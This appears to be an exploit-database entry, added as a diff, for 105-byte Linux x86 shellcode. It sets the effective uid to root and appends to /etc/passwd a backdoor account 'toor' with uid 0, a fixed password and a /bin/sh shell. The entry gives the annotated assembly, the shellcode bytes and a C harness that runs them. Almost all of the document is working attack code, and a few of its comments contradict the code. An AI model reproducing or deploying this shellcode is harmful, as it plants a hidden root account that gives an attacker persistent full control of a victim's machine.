@@ -1,0 +1,88 @@
+id: 14237
+date: 09/28/2010
+title: linux/x86 setreuid(0) and add user with root's priviledges 105 bytes
+author: xertux
+cves: 
+
+====================================================================
+linux/x86 setreuid(0) and add user with root's priviledges 105 bytes
+====================================================================
+
+#include <stdio.h>
+
+ /*
+  * Title : linux x86 shellcode setreuid(0, 0) and add an user with root's priviledges on /etc/passwd, 105 bytes
+  * Author : xertux
+  * Platform: Linux X86
+  * Description : setuid(0) + open(/etc/passwd, e0x441, 0x180) + write(fd, toor:Gf.Dz3qr2izHU:0:0::/:/bin/sh\n, 34) + close(fd)
+  * 			Add an user "toor" with password "toor" and the root's priviledges at the end of "/etc/passwd"
+  * Size : 105 bytes
+  * */
+
+/*
+BITS 32
+
+;setresuid(0,0)
+xor eax, eax         ; eax become 0
+xor ebx, ebx         ; ebx become 0
+xor ecx, ecx         ; ecx become 0
+cdq                  ; edx become 0
+mov al, 0xa4         ; put call system 164 into eax
+int 0x80             ; execute setresuid(0,0,0)
+
+;open(/etc/passwd, e0x441, 0x180)
+push edx             ; null string termination
+push 0x64777373      ; push "sswd"
+push 0x61702f2f      ; push "//pa"
+push 0x6374652f      ; push "/etc"
+mov ebx, esp         ; put "/etc//passwd" into ebx
+mov WORD cx, 0x441   ; put the O_WRONLY | O_APPEND | O_CREATE argument
+mov WORD dx, 0x180   ; put the S_IRUSR | S_IWUSR argument
+push BYTE 0x5        ; put call system open on the stack
+pop eax              ; get the system call number and insert into eax
+int 0x80             ; execute open(/etc//passwd, O_WRONLY | O_APPEND, S_IRUSR | S_IWUSR)
+
+;write(fd, toor:Gf.Dz3qr2izHU:0:0::/:/bin/sh\n, 34) ==> pass "toor"
+mov ebx, eax         ; put the file descriptor return by open into ebx
+xor eax, eax         ; eax become 0
+push eax             ; null termination string
+push WORD 0x0a68     ; push "h\n"
+push 0x732f6e69      ; push "in/s"
+push 0x622f3a2f      ; push "/:/b"
+push 0x3a3a303a      ; push ":0::"
+push 0x303a5548      ; push "HU:0"
+push 0x7a693272      ; push "r2iz"
+push 0x71337a44      ; push "Dz3q"
+push 0x2e66473a      ; push ":Gf."
+push 0x726f6f74      ; push "toor"
+mov ecx, esp         ; put "toor:toor:0:0::/:/bin/sh\n" into ebx
+push BYTE 34         ; put the size of line written on the stack
+pop edx              ; get the size into edx
+mov al, 0x4          ; put the call system write into eax
+int 0x80             ; execute write(fd, toor:toor:0:0::/:/bin/sh\n, 34)
+
+;close(fd)
+push BYTE 0x6        ; put the call system close on the stack
+pop eax              ; put the call system number into eax
+int 0x80             ; execute close(fd)
+*/
+
+char shellcode[] =
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x52\x68\x73\x73\x77"
+"\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x41"
+"\x04\x66\xba\x80\x01\x6a\x05\x58\xcd\x80\x89\xc3\x31\xc0\x50\x66"
+"\x68\x68\x0a\x68\x69\x6e\x2f\x73\x68\x2f\x3a\x2f\x62\x68\x3a\x30"
+"\x3a\x3a\x68\x48\x55\x3a\x30\x68\x72\x32\x69\x7a\x68\x44\x7a\x33"
+"\x71\x68\x3a\x47\x66\x2e\x68\x74\x6f\x6f\x72\x89\xe1\x6a\x22\x5a"
+"\xb0\x04\xcd\x80\x6a\x06\x58\xcd\x80";
+
+int main()
+{
+	printf("[*] Shellcode - length: %d\n", strlen(shellcode));
+	(*(void(*)())shellcode)();
+	return 0;
+}
+
+
+
+#  0day.today [2023-03-26]  #
